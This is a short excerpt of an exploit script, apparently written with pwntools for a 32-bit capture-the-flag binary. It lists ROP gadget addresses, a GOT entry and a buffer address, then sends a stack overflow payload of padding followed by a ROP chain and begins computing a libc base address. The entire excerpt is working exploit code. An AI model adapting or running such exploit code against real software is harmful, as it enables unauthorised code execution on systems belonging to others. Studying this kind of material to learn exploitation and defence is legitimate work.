...
pop_esi_edi_ebp_ret=0x0804870d
pop_ebx=0x80483f1# pop ebx ; ret

ebxv = 0xf6fff000
libc_start_main_got = 0x804a02c #0xf7d45180 #0xf660e180
pop_ebp_ret = 0x0804870f
leave_ret = 0x8048528
buf = 0x0804b000-0x30 #0x804c170
ret = 0x080486a9     #0xc3  #The last two bits are changed to 0  #0xf65e9e81
...
r.recv()
#raw_input('send rop1')
#r.send(('A'*92)+p32(ret)+''.join(map(p32,rop1))+('B'*52)+p32(ret)+'\n')
r.send(('A'*88)+p32(0xf6fff078)+''.join(map(p32,rop1))+'\n')
sleep(1);
#r.recv();

raw_input('send rop2')
libc =0xf660e180- 0x00018d90 
